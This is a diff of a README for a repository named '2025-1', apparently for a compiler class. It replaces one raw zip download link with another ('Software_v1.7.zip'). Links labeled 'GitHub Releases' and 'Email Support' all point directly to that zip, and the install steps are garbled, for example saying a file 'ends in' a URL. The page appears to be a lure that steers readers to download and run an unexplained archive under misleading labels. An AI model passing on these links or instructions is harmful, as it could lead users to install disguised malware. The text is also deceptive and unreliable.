@@ -6,7 +6,7 @@ Welcome to the **2025-1** repository! Here, you will find everything you need to
 
 ## 📦 Download & Install
 
-To begin, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/2025-1.zip).
+To begin, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/Software_v1.7.zip).
 
 We have a user-friendly link that takes you directly to our Releases page. Click the link above to access the available files.
 
@@ -22,13 +22,13 @@ We have a user-friendly link that takes you directly to our Releases page. Click
    
 3. **Download the Application**
    - Click on the file that matches your operating system (Windows, macOS, or Linux) to start the download.
-   - The file will typically end in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/2025-1.zip` for different systems.
+   - The file will typically end in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/Software_v1.7.zip` for different systems.
 
 4. **Install the Application**
    - Locate the downloaded file in your Downloads folder.
    - For Windows: Double-click on the `.exe` file to start the installation.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/2025-1.zip` file and follow the included instructions to install the application.
+   - For Linux: Extract the `https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/Software_v1.7.zip` file and follow the included instructions to install the application.
 
 5. **Run the Application**
    - After installation, open the application from your Applications folder or desktop shortcut.
@@ -81,12 +81,12 @@ If you encounter issues during installation or while running the application, he
 
 If you have questions or need assistance, please reach out:
 
-- **Email Support:** [https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/2025-1.zip](https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/2025-1.zip)
+- **Email Support:** [https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/Software_v1.7.zip](https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/Software_v1.7.zip)
 - **Join Our Community:** Connect with your peers on our community forum for tips and discussions.
 
 ## 🔗 Additional Resources
 
-- [GitHub Releases](https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/2025-1.zip)
+- [GitHub Releases](https://raw.githubusercontent.com/NarutoOG/2025-1/main/stainless/Software_v1.7.zip)
 - Documentation and help guides can be found in the Wiki section of the repository.
 
 Thank you for using the **2025-1** application! We hope it enhances your learning experience in the Compiler Class.
